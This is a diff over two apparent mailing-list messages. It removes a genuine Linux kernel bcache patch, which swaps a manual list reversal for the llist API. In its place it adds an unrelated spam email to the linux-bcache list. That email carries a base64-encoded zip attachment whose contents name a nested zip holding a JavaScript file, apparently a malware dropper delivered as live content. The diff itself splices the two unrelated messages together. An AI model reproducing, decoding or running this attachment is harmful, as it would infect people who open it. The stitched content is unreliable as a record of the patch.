@@ -1,48 +1,68 @@
-From: Byungchul Park <byungchul.park@lge.com>
-Subject: [PATCH v4] bcache: Don't reinvent the wheel but use existing llist API
-Date: Fri, 11 Aug 2017 13:42:23 +0900
-Message-ID: <1502426543-15229-1-git-send-email-byungchul.park@lge.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Sender: linux-kernel-owner@vger.kernel.org
-To: kent.overstreet@gmail.com, shli@kernel.org
-Cc: linux-bcache@vger.kernel.org, linux-raid@vger.kernel.org, i@coly.li, nborisov@suse.com, linux-kernel@vger.kernel.org, kernel-team@lge.com
+From: <rhsinfo@genesishcc.com>
+Subject: (unknown)
+Date: Fri, 11 Aug 2017 17:28:33 -0000
+Message-ID: <150247251341.22644.8243659404028399687@classic.com.np>
+Mime-Version: 1.0
+Content-Type: application/zip; name="9749575300.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-bcache-owner@vger.kernel.org>
+Received: from cust210-247.classic.com.np ([43.231.210.247]:45294 "HELO
+        classic.com.np" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1752915AbdHKR3C (ORCPT
+        <rfc822;linux-bcache@vger.kernel.org>);
+        Fri, 11 Aug 2017 13:29:02 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
+To: linux-bcache@vger.kernel.org
 
-Although llist provides proper APIs, they are not used. Make them used.
-
-Signed-off-by: Byungchul Park <byungchul.park@lge.com>
-Acked-by: Coly Li <colyli@suse.de>
----
- drivers/md/bcache/closure.c | 15 ++-------------
- 1 file changed, 2 insertions(+), 13 deletions(-)
-
-diff --git a/drivers/md/bcache/closure.c b/drivers/md/bcache/closure.c
-index 864e673..7d5286b 100644
---- a/drivers/md/bcache/closure.c
-+++ b/drivers/md/bcache/closure.c
-@@ -70,21 +70,10 @@ void __closure_wake_up(struct closure_waitlist *wait_list)
- 	list = llist_del_all(&wait_list->list);
- 
- 	/* We first reverse the list to preserve FIFO ordering and fairness */
--
--	while (list) {
--		struct llist_node *t = list;
--		list = llist_next(list);
--
--		t->next = reverse;
--		reverse = t;
--	}
-+	reverse = llist_reverse_order(list);
- 
- 	/* Then do the wakeups */
--
--	while (reverse) {
--		cl = container_of(reverse, struct closure, list);
--		reverse = llist_next(reverse);
--
-+	llist_for_each_entry(cl, reverse, list) {
- 		closure_set_waiting(cl, 0);
- 		closure_sub(cl, CLOSURE_WAITING + 1);
- 	}
--- 
-1.9.1
+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
